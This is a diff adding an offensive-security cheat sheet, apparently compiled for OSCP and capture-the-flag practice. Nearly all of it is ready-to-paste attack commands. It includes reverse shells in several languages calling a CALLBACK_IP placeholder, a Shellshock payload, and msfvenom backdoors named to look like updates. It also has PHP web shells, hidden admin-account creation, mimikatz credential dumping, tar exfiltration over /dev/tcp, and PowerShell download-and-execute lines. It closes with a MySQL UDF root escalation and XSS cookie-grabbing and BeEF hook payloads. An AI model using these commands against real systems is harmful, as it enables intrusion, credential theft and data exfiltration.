@@ -1,0 +1,736 @@
+#    ___  _____  ___      ___          _             _     _           
+#   / __\/__   \/ __\    / _ \__ _ ___| |_ ___  __ _| |__ | | ___  ___ 
+#  / /     / /\/ _\____ / /_)/ _` / __| __/ _ \/ _` | '_ \| |/ _ \/ __|
+# / /___  / / / /|_____/ ___/ (_| \__ \ ||  __/ (_| | |_) | |  __/\__ \
+# \____/  \/  \/       \/    \__,_|___/\__\___|\__,_|_.__/|_|\___||___/
+
+Version 8 10/16/2019
+Version 7 5/18/2018
+Version 6 12/27/2017
+Version 5 3/26/2017
+Version 4 1/04/2017
+Version 3 12/16/2016
+Version 2 09/9/2016
+
+Created by jfer (jfer@compsecdirect.com) @jfersec #jfersec
+Change Log:
+Version 8: Open-Source Version
+Version 7: OSCP exam edits
+Version 6: OSCP edits
+Version 5: Added recent exploits, rbash nv, vi nc, unsets, backdoor names, obfuscation section
+Version 4: Added some Netwars Shells
+Version 3: Added dirty cow, tested in "nerd-combat" @ Netwars
+Version 2: Added shells
+Version 1: 11/24/2014 - First batch
+
+Credits:
+Pentest Monkey: http://pentestmonkey.net/
+Commandline Kung-Fu: http://commandlinekungfu.com
+High On Coffee: https://highon.coffee/
+
+
+===========================================================
+*Pre-Starts*
+script `hostname`-commands-`date +"%m-%h-%y-%H-%M-%S"`
+PS1="[\u@\h, load: `cat /proc/loadavg | awk '{ print $1; }'`] (\d - \t) \w : "
+
+-VIM-
+:nnoremap <F5> "=strftime("%c")<CR>P
+:inoremap <F5> <C-R>=strftime("%c")<CR>
+
+-Atom-
+apm install insert-timestamp
+edit KeyMap and add
+'atom-text-editor':
+  'f5': 'insert-timestamp:DateT'
+
+iptables -P INPUT DROP
+iptables -P FORWARD DROP
+iptables -P OUTPUT DROP
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+iptables -A OUTPUT -p udp  -d DNS_IP -o eth0 -m state --dport 53 --state NEW,ESTABLISHED -j ACCEPT
+iptables -A INPUT -p udp -s DNS_IP -i eth0 --sport 53 -m state --state ESTABLISHED -j ACCEPT
+iptables -A OUTPUT -o eth0 -p tcp -d PIVOT_IP --dport PIVOT_PORT -m state --state NEW,ESTABLISHED -j ACCEPT
+iptables -A INPUT -i eth0 -p tcp -s PIVOT_IP --sport PIVOT_PORT -m state --state ESTABLISHED -j ACCEPT
+
+ipconfig eth0 MY_IP netmask 255.255.255.0
+*Tor Option*
+
+wget http://torstatus.blutmagie.de/ip_list_exit.php/Tor_ip_list_EXIT.csv
+
+for i in $(cat /root/Tor_ip_list_EXIT.csv) do
+iptables -N TORBLOCK
+iptables -F TORBLOCK
+iptables -I TORBLOCK -j RETURN
+iptables -I TORBLOCK -s IPADDRESS -j
+
+service postgresql start;
+msfdb init;
+
+
+
+TxT Wide Variables - For easy replace, just undo replaces for additionals
+===========================================================
+%s/PIVOT_IP/new-text/g
+%s/PIVOT_PORT/new-text/g
+%s/DNS_IP/new-text/g
+%s/DST_IP/new-text/g
+%s/CALLBACK_IP/new-text/g
+%s/DST_PORT/new-text/g
+%s/CALLBACK_PORT/new-text/g
+===========================================================
+===========================================================
+Scans
+===========================================================
+*General Full Scan*
+db_nmap -sV -sT -sU -T5 -O -Pn -n DST_IP -oA nmap-full-DST_IP-`date` --script smb-os-discovery,smb-check-vulns --randomize-hosts -vv
+db_nmap -sV -sT -sU -T5 -O -Pn -n 10.2.2.0/24 -oA nmap-full-10.2.2.0-24-`date` --script smb-os-discovery,smb-check-vulns --randomize-hosts -vv
+db_nmap -sV -sT -T5 -O -Pn -n 10.3.3.34,47,88 -oA /opt/OSCP-Migrate/consolidated/Analysis/Admin-Network/Scans/nmap-full-10.3.3.0-selected-jan-18-2018 --script smb-os-discovery,smb-check-vulns --randomize-hosts -vv
+
+nmap -sV -sT -sU -T5 -O -Pn -n 10.2.2.0/24 -oA nmap-full-10.2.2.0-24-`date` --script smb-os-discovery,smb-check-vulns --randomize-hosts -vv
+
+*Web Scan*
+nikto -h DST_IP
+nikto -h $i -o "nikto-$i" -Format xml -p $p
+nikto -h DST_IP -o nikto-DST_IP -Format xml -p 80
+
+*nmap*
+nmap -v -sU -sS -p- -A -T5
+
+proxychains nmap -Pn -sV -sT -T5 -O --dns-servers DNSSERVER IPRANGE -oA nmap-full-IPRANGE-DATE-identified -sC --randomize-hosts -vv
+proxychains nmap -Pn -sV -sT -T5 -O --dns-servers 10.2.2.15 10.2.2.15 -oA nmap-full-10.2.2.15 -sC --randomize-hosts -vv
+===========================================================
+Exploits
+===========================================================
+*For purchase*
+https://exploithub.com
+
+*Free*
+https://www.exploit-db.com/
+
+
+*metasploit*
+
+-add new exploit-
+
+mkdir -p ~/.msf4/modules/exploits/windows/browser
+cp exploit.rb to ~/.msf4/modules/exploit/
+reload_all
+
+-search exploits-
+
+grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
+searchsploit windows 2003 | grep -i local
+
+searchsploit linux 2.6 --exclude="(PoC)|/dos/"
+
+*Dirty Cow*
+
+https://gist.githubusercontent.com/scumjr/17d91f20f73157c722ba2aea702985d2/raw/a37178567ca7b816a5c6f891080770feca5c74d7/dirtycow-mem.c
+memory-cow exploit - compiled on Ubuntu 14.03
+
+./memory-cow ; echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+
+*shell shock*
+
+curl -H User-Agent: () { :; };/bin/bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT
+
+*DCCP*
+
+https://dl.packetstormsecurity.net/1702-exploits/linux440-dos.txt
+
+*CUPS*
+https://dl.packetstormsecurity.net/1702-exploits/cups-exec.txt
+
+41233.py
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=DST_IP LPORT=53 -f elf-so > shell.so
+python 41233-2.4.py -a 127.0.0.1 -b 631 -c /var/tmp/shell.so
+
+*Echonet*
+http://pastebin.com/2t13Kigv
+
+
+
+===========================================================
+Shells
+===========================================================
+*Double Telnet*
+
+on localbox
+nc -lvp 31337
+
+on target
+telnet CALLBACK_IP CALLBACK_PORT | /bin/bash | telnet CALLBACK_IP 1337
+
+*dev tcp*
+--does not work on modern ubuntu due to lack of /dev/tcp compiled in bash-
+bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT 0>&1
+
+example:
+bash -i >& /dev/tcp/10.11.0.80/21 0>&1
+
+*python tty*
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+*python shell*
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CALLBACK_IP",CALLBACK_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+example:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.80",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.11.0.80 LPORT=21 > pyterpreter.py
+
+*perl shell hybrid*
+sh -c perl -e 'use Socket;$i="CALLBACK_IP";$p=CALLBACK_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'. python -c 'import pty; pty.spawn("/bin/bash");'
+
+*php*
+php -r '$sock=fsockopen("CALLBACK_IP",CALLBACK_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php echo shell_exec("/bin/sh"); ?>
+
+*ruby*
+ruby -rsocket -e'f=TCPSocket.open("CALLBACK_IP",CALLBACK_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+*netcat*
+nc -e /bin/sh CALLBACK_IP CALLBACK_PORT
+
+*mimikatz PTH*
+mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:7D0B174ECE1E52535A1C26D91AC4F5A9 /run:”powershell -w hidden”
+
+*sendmail*
+sh -c /usr/sbin/sendmail -bv "root+:"|nc CALLBACK_IP CALLBACK_PORT -e /bin/bash 2>&1"
+
+===========================================================
+Jail breaks, escapes
+===========================================================
+
+*vi*
+:python3 import pty; pty.spawn('/bin/bash')
+python -c "import pty; pty.spawn('/bin/bash')"
+:!/bin/sh
+
+*declare*
+declare -n PATH
+export PATH=/bin/sh;or /usr/bin or /flag
+
+*lshell*
+echo os.system('/bin/bash')
+
+===========================================================
+Obfuscation
+===========================================================
+
+cat < dev > app   ** needs clarification
+bash -e "exec -a 'appear' app"
+
+===========================================================
+File Transfers
+===========================================================
+-scp-
+scp -i netwars.priv -P 62201 user@netwars-ng.counterhack.com:/home/user/backup.7z .
+scp -P 7777 wce.exe j0hn@127.0.0.1:/home/j0hn
+
+-python webserver-
+python -m SimpleHTTPServer 80
+
+*dev tcp*
+bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT 0>&1
+
+
+*perl upload*
+perl -MIO::Socket::INET -ne 'BEGIN{$l=IO::Socket::INET->new(
+  LocalPort=>LPORT,Proto=>"tcp",Listen=>5,ReuseAddr=>1);
+  $l=$l->accept}print $l $_' < ~/.bashrc
+
+*samba mount*
+mount -t cifs -o username=winuser,password=winpwd //DST_IP/myshare /mnt/share
+
+*smbd*
+
+[smb]
+path=/tmp/share
+read only=no
+create mask=777
+browseable = yes
+guest ok = yes
+
+service smbd start
+
+*smbclient
+
+===========================================================
+Shell Uploads
+===========================================================
+proxychains rdesktop DST_IP -u username -p passowrd -r disk:sharename=/tmp
+
+===========================================================
+Backdoors
+===========================================================
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=CALLBACK_IP LPORT=CALLBACK_PORT -f exe > msupdate.exe
+
+example:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=DST_IP LPORT=4434 -f exe > drupal6.exe
+
+-older veil-
+veil-evasion -p python/shellcode_inject/aes_encrypt --msfpayload windows/meterpreter/reverse_tcp --msfoption LHOST=DST_IP LPORT=4433
+
+-new veil-
+in /opt/Veil --- mkdir dist
+./Veil.py -t Evasion -p 29 --msfvenom windows/meterpreter/reverse_tcp --ip DST_IP --port 4433 -o drupal4.exe
+
+msfconsole -r veilevasion_handler.rc
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=DST_IP LPORT=443 -f exe > msupdate.exe
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=CALLBACK_IP LPORT=CALLBACK_PORT -f elf > shell.elf
+
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=CALLBACK_PORT -f elf > shell.elf
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=DST_IP LPORT=8081 -f elf-so > shell.so
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=DST_IP LPORT=80 -e php/base64 R > php-met.php
+
+
+-adding admin user-
+net user /add bobo bobobobo
+net localgroup administrators bobo /add
+
+
+echo. & echo cmd.exe /c "C:\Documents and Settings\james\desktop\msupdate.exe" >> backup-python.cmd
+echo. & echo cmd.exe /c "C:\Documents and Settings\james\desktop\msupdate.exe" >> backup-c.cmd
+echo\n & echo cmd.exe /c "C:\Documents and Settings\james\desktop\msupdate.exe" >> backup-perl.cmd
+echo\n & echo net user /add bobo bobobobo > backup-perl.cmd
+echo\n>>backup-perl.cmd
+echo\n & echo net localgroup administrators bobo /add >> backup-perl.cmd
+echo\n & echo net localgroup administrators bobo /add > backup-python.cmd
+
+NET LOCALGROUP "Remote Desktop Users" bobo /ADD
+
+*php*
+<?php echo shell_exec($_GET['cmd']);?>
+
+
+===========================================================
+Implants
+===========================================================
+*mimikatz*
+privilege::debug
+log mk.log
+sekurlsa::logonpasswords
+sekurlsa::ekeys
+sekurlsa::kerberos
+python -c "import pty; pty.spawn('/bin/bash')"
+
+*pwdump7*
+
+===========================================================
+Enumeration
+===========================================================
+*SNMP*
+db_nmap -sU -vv --script=snmp-brute DST_IP --script-args snmp-brute.communitiesdb=b=SNMP_WORDLIST
+
+*SMB*
+smbclient –L DST_IP –U administrator
+
+*smb enum*
+enum4linux DST_IP
+
+*Login Attempts*
+-Medusa-
+needs :user:pass format
+proxychains medusa -H DST_IP-rdp.addr -U accounts -P creds -M smbnt
+proxychains medusa -H rdp-hosts-ips -C hashes-creds -M rdp -O valid-logins
+proxychains medusa -h DST_IP -C hashes-creds -M ssh -O valid-logins-ssh
+
+-Hydra-
+hydra DST_IP -s 9505 http-get -L all-words-uniq -P all-words-uniq "/~login" -u -V -o results
+
+*DNS*
+dig axfr @DNSSERVER domain.fqdn
+dig axfr @DST_IP it.tryharder
+dig axfr @DST_IP admin.tryharder
+
+*WebDav*
+proxychains nmap -sC --script http-webdav-scan -p 1234 DST_IP -oA DST_IP-webdav-scan
+
+*wpscan*
+proxychains wpscan -u DST_IP:9999 --wordlist /usr/share/wordlists/fasttrack.txt --username admin --random-agent
+
+*perl port scanner*
+perl -MIO::Socket -le 'for ($i=1;$i<65536;$i++) { if (my $s=IO::Socket::INET->new(PeerAddr=>$ARGV[0],PeerPort=>$i,Proto=>'tcp') ) { print "$i ";close ($s); } }' DST_IP
+
+
+*nc for loop?*
+for i in $(echo "DST_IP"|tr "," "\n"); do echo -e "22\n80\n443\n8080" | xargs -i /usr/bin/nc -w 1 -zvn $i {}; done
+
+for port in $(seq 1 65535); do nc -nz DST_IP $port && echo tcp/$port is open; done
+
+*dev tcp loop*
+for i in $(seq 1 65535); do bash -i >& /dev/tcp/DST_IP/$i 0>&1; done
+
+===========================================================
+Databases
+===========================================================
+<MySQL>
+show databases;
+show tables;
+select * from user;
+select LOAD_FILE('/root/proof.txt');
+
+echo 123456 | mysql -u root passman -p -e "select password from passwd where user_name="root"" > /tmp/db-results
+
+
+===========================================================
+Creds
+===========================================================
+*Remote SAM*
+./samrdump.py administrator:abc123@DST_IP
+
+*mimikatz*
+migrate to 64bit process
+load mimikatz
+wdigest
+
+*samdump2*
+-xp-
+system?../../../../windows/repair/system
+sam?../../../../windows/repair/sam
+
+-win7-
+\windows\system32\config\regback
+
+findstr /S /M /I /C:"password" *
+
+findstr /S /M /I /C:"password" * > c:\users\public\pass.txt
+
+===========================================================
+Keylogging
+===========================================================
+
+===========================================================
+Mail
+===========================================================
+
+===========================================================
+Loops
+===========================================================
+*Read File*
+for node in `/bin/grep -v -e ^# ${TORIPLIST}`
+do
+/sbin/iptables -I TORBLOCK -s $node -j DROP
+done
+
+
+
+===========================================================
+Scripts
+===========================================================
+<auto_priv>
+auto_priv_exploit.sh 2.6
+move the tar to target
+untar
+find . -name '*.c' -exec gcc {} -o {}-local \;
+find . -name '*local' -exec {} \;
+find . -type f -newermt 2017-11-04 | xargs tar -czf File.tar
+===========================================================
+Links
+===========================================================
+
+===========================================================
+Compiles /Cross compile
+===========================================================
+apt-get install g++-multilib libc6-dev-i386
+
+gcc -m32 -no-pie -Wl,--hash-style=both -o sendpage /usr/share/exploitdb/platforms/linux/local/9545.c
+
+===========================================================
+Tunneling
+===========================================================
+
+ssh root@DST_IP -R 22:localhost:2222
+
+so on restricted hosts, they ssh into you and make a tunnel back
+make ssh listen on the port you want
+target ->you +add reverse-tunnel back into target itself
+you -> your reverse -> target +add dynamic port locally to use for proxychains
+
+ssh user@DST_IP -p 53 -R7777:CALLABACK_IP:22
+ssh user@DST_IP -p 53 -R7777:CALLABACK_IP:3389
+ssh otheruser@127.0.0.1 -p 7777 -D 9898
+
+*meterpreter*
+route add 10.4.4.0 255.255.255.0 1
+route add 10.2.2.0 255.255.255.0 1
+
+-portfwd-
+
+portfwd add -l 9999 -r 10.11.1.50 -p 445
+
+*owasp-zap*
+ owaspzap -DsocksProxyHost=127.0.0.1 -DsocksProxyPort=9892
+
+===========================================================
+Passive Collection
+===========================================================
+
+===========================================================
+Reconnaissance
+===========================================================
+netdiscover -r IPRANGE/NOTATION
+
+*passlist generations*
+cewl -d4 -m5 -w wordlist http://DST_IP:9505
+
+*convert file to lower/upper case*
+perl -ne 'print lc' short-user-list / perl -ne 'print uc' short-user-list
+
+*combinator*
+/usr/lib/hashcat-utils/combinator.bin all-words-uniq-combined all-words-uniq-combined > combo-uniqs
+
+===========================================================
+Exfil
+===========================================================
+*tar dev/tcp*
+tar zcf - localfolder >/dev/tcp/DST_IP/DST_PORT
+tar zcf - localfolder | xxd -p >/dev/tcp/DST_IP/DST_PORT
+
+-new msf-
+set AutoRunScript multi_console_command -r auto-post.txt
+
+-across all sessions-
+sessions -C "run multi_console_command -r auto-post.rc"
+
+-older msf-
+set AutoRunScript multi_console_command -rc auto-post.txt
+
+
+*
+
+
+===========================================================
+Remote
+===========================================================
+*RDP Enable*
+wmic /node:DST_IP RDToggle where servername="servername" call SetAllowTSConnections 1
+ or from xp
+wmic /node:servername path Win32_TerminalServiceSetting where AllowTSConnections=0 call SetAllowTSConnections 1
+
+===========================================================
+Elevation / Priv Esc / Escalation
+===========================================================
+*windows*
+
+-msf style-
+exploit/windows/local/service_permissions
+
+-check user perms-
+net localgroup administrators
+
+windows-exploit-suggester.py
+./windows-exploit-suggester.py -i sysinfo-drupal.txt -d 2018-01-11-mssb.xls -l
+
+runas /user:realusername\administrator cmd
+runas /user:realusername\administrator /savecred drupal5.exe
+
+accesschk.exe
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+sc query state= all |find /i "SSDPSRV"
+sc qc upnphost
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost binpath= "C:\inetpub\wwwroot\msupdate.exe"
+sc start upnphost
+
+*powershell*
+powershell.exe -nop -exec bypass
+set-executionpolicy -executionpolicy unrestricted
+powershell.exe -executionpolicy unrestricted -File "C:\Scripts\Do-Something.ps1"
+powershell.exe -executionpolicy unrestricted IEX(New-Object Net.WebClient).DownloadString ("http://CALLBACK_IP:8081/CodeExecution/Invoke-Shellcode.ps1")
+powershell.exe -executionpolicy unrestricted IEX(New-Object Net.WebClient).DownloadString ("http://CALLBACK_IP:8081/SharpHound.ps1")
+
+-executionpolicy unrestricted IEX(New-Object Net.WebClient).DownloadString ("http://CALLBACK_IP:8081/CodeExecution/Invoke-Shellcode.ps1")
+Invoke-Shellcode -Payload windows/x64/meterpreter/reverse_http -lhost CALLBACK_IP -lport 4434 -Force
+
+*bloodhound*
+neo4j console
+bloodhound
+upload BloodHound/Ingestors/SharpHound.exe
+execute -f SharpHound.exe
+download and import the csv's generated
+
+*python elevation*
+#!/usr/bin/python
+import os
+os.system('/bin/bash')
+
+*mysql elevation*
+wget 0xdeadbeef.info/exploits/raptor_udf2.c
+$ gcc -g -c /tmp/raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/DIRUSED/raptor_udf2.so'));
+mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+select * from foo into dumpfile '/usr/lib/mysql/raptor_udf2.so';
+select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+exit
+cp  raptor_udf2.so /usr/lib/mysql/plugin/raptor_udf2.so
+cp  raptor_udf2.so /usr/lib/mysql/raptor_udf2.so
+[back in]
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
+
+-bad-opsec-
+mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');
+mysql> select do_system('sed 's/1000/0/g' /etc/passwd -i');
+
+better opsec>>>?
+select do_system('useradd -o -u 0 -g root bobo2 ; echo "bobo2:bobobobo" | chpasswd > /tmp/out; chown j0hn:j0hn /tmp/out')
+
+the harder way..
+select do_system('echo /etc/shadow > /tmp/out; chown j0hn:j0hn /tmp/out');
+
+*metasploit *
+-for windows meterpreter reverse_tcp or linux python/meterpreter/reverse_tcp-
+use post /multi/manage/shell_to_meterpreter
+session -u SESSIONID
+use post/multi/manage/shell_to_meterpreter
+
+
+[LINUX]
+*LinEnum*
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+
+*Linux Priv Checker*
+wget http://www.securitysift.com/download/linuxprivchecker.py
+
+echo '#!/bin/bash' > /tmp/run
+echo '/bin/bash' >> /tmp/run
+
+*Linux Exploit Suggester*
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+
+./linux-exploit-suggester.sh --userspace-only
+./linux-exploit-suggester.sh -k 3.1
+
+./linux-exploit-suggester.sh --uname $(uname -a)
+
+*write to /etc/passwd'
+echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
+===========================================================
+LFI/RFI
+===========================================================
+*ACS*
+http://DST_IP/internal/advanced_comment_system/index.php?ACS_path=http://CALLBACK_IP/php-cat.php%00
+
+
+===========================================================
+Cracking
+===========================================================
+-john-
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+
+-oclhashcat-
+hashcat -m 1800 -a 0 -o CRACKEDRESULTS --remove HASHFILE WORDLIST
+
+-hashkiller-
+https://hashkiller.co.uk/default.aspx
+
+===========================================================
+Aliases
+===========================================================
+-linux unsets-
+unset HISTSIZE
+unset HISTFILE
+unset HISTFILESIZE
+
+
+===========================================================
+ClientSide
+===========================================================
+*BeEF quick config*
+-msf-
+/usr/share/beef-xss/config.yaml
+set metasploit to true
+
+/usr/share/beef-xss/extensions/metasploit/config.yaml
+ name: 'Metasploit'
+            enable: true
+            host: "127.0.0.1"
+            port: 55552
+            user: "msf"
+            pass: "abc123"
+            uri: '/api'
+            ssl: true ## set true yeah!
+            ssl_version: 'TLS1'
+            ssl_verify: true
+            callback_host: "127.0.0.1"
+            autopwn_url: "autopwn"
+beef-xss
+in metasploit
+load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
+
+
+*Quick Hook for Cookies*
+
+nc -l -p 1099 -v
+
+*Cookie grabber*
+https://raw.githubusercontent.com/kensworth/cookie-stealer/master/cookielogger.php
+
+<script type='text/javascript' src='http://CALLBACK_IP></script>
+<img src='http://CALLBACK_IP>'
+
+
+*UXE Cookie Grab*
+use auxiliary/gather/android_stock_browser_uxss
+
+*Redirects*
+*works*
+<img src="missing.jpg" onerror=document.location="http://CALLBACK_IP";>
+<img src="missing.jpg" onerror=document.location="http://CALLBACK_IP/skylight.html";> called back, did not load
+
+
+<iframe%20height="0"%20width="0"%20src='http://CALLBACK_IP/skylight.html'></iframe> nope!
+
+
+works! BeeF
+<script> src='http://CALLBACK_IP:3000/hook,js'; </script>
+
+<script>window.open("http://CALLBACK_IP/skylight.html");</script> // testing....looks good....nope :-(
+<script>window.open('http://CALLBACK_IP/skylight.html');</script> //testing...looks good....nope :-(
+<iframe width="0" height="0" frameborder="0" src="http://CALLBACK_IP/skylight.html"></iframe> //testing....looks good...worked!!!
+
+i frame onload=
+<iframe%20height="0"%20width="0"%20src="http://CALLBACK_IP:6767"></iframe>
+<iframe%20height="0"%20width="0"%20src="http://CALLBACK_IP/skylight.html"></iframe>
+
+<a href="http://CALLBACK_IP">Click this!!!</a>
+
+<script> s=document.createElement('script'); s.type='text/javascript'; s.src='http://CALLBACK_IP:3000/hook.js'; document.getElementsByTagName('head')[0].appendChild(s); </script>
+
+*aurora*
+working!
+<script> s=document.createElement('script'); s.type='text/javascript'; s.src='http://CALLBACK_IP:81/ZRN4QjyT'; document.getElementsByTagName('head')[0].appendChild(s); </script>
+
+<iframe width="0" height="0" frameborder="0" src="http://CALLBACK_IP:8080/xz1D88mlJ8s"></iframe> //testing...worked with simple shell....!!!
+
+-via python 11167.py-
+<script> s=document.createElement('script'); s.type='text/javascript'; s.src='http://CALLBACK_IP/skylight.html'; document.getElementsByTagName('head')[0].appendChild(s); </script> nope not a script
+<iframe> src='http://CALLBACK_IP:6767/'</iframe> nope!
+
+Annex 2
+
+Python Shell?
+python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CALLBACK_IP",3437));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+Perl/Python Hybrid
+sh -c perl -e 'use Socket;$i="CALLBACK_IP";$p=7555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'. python -c 'import pty; pty.spawn("/bin/bash");'
+
+http://DST_IP/cgi-bin/perl?-Esay,system%20q@nc CALLBACK_IP 21 -e /bin/sh@
+
+
+quik find
+ls -lart /etc/{pass*,sha*}
